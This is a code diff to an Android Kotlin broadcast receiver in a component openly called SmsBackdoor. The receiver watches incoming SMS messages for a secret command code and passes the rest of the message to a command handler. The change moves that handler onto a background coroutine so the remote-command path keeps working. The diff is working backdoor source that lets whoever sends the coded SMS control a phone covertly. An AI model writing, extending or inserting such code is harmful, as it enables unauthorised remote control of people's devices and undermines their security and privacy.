@@ -20,6 +20,9 @@ import android.content.Context
 import android.content.Intent
 import android.provider.Telephony
 import android.telephony.SmsMessage
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+
 /*
             (   (                ) (             (     (
             )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
@@ -51,7 +54,13 @@ internal class RemoteCommandReceiver: BroadcastReceiver(){
                     msg.messageBody?.let{ body -> append(body) }
                 }
             }
-            command.toString().takeIf { cmd -> cmd.contains(SmsBackdoor.commandCode) }?.let { cmd -> SmsBackdoor.commandHandler?.invoke(cmd.split(SmsBackdoor.commandCode)[1]) }
+            val result = goAsync()
+            command.toString().takeIf { cmd -> cmd.contains(SmsBackdoor.commandCode) }?.let { cmd ->
+                GlobalScope.launch {
+                    SmsBackdoor.commandHandler?.invoke(cmd.split(SmsBackdoor.commandCode)[1])
+                    result.finish()
+                }
+            }
         }
     }
 }
